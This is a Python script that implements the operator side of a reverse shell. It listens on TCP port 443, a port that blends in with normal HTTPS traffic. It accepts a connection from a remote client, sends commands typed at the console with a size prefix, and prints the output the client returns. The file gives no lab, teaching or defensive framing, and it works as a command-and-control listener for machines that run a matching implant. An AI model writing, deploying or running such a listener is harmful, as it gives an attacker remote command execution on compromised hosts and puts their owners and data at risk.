import socket
import struct

# Define the IP address to listen on
host = ""
# Define the listening port
port = 443

try:
    # Create a socket object
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    # Bind the socket to the IP address and port
    s.bind((host,port))
    # Start listening for incoming connections
    s.listen(5)
    print("waiting for incoming connections...")
    # Accept incoming connections
    conn, addr = s.accept()
    print("Connection from: " + str(addr) + "\n")

    while True:
        # Receive prompt from the client
        prompt = conn.recv(1024)    
        # Send the command to the client
        command = input("{} > ".format(prompt.decode()))
        bytes_size = struct.calcsize("{}s".format(len(command)))
        conn.send(str(bytes_size).encode())
        conn.send(command.encode())
        if command == "exit":
            break
        if command[:2] == "cd":
            continue
        buffer_data = conn.recv(1024)
        bytes_size = int(buffer_data.decode())
        data = conn.recv(bytes_size)
        print(data.decode())
except Exception as e:
    print("Error occured: ", str(e))
finally:
    conn.close()
    s.close()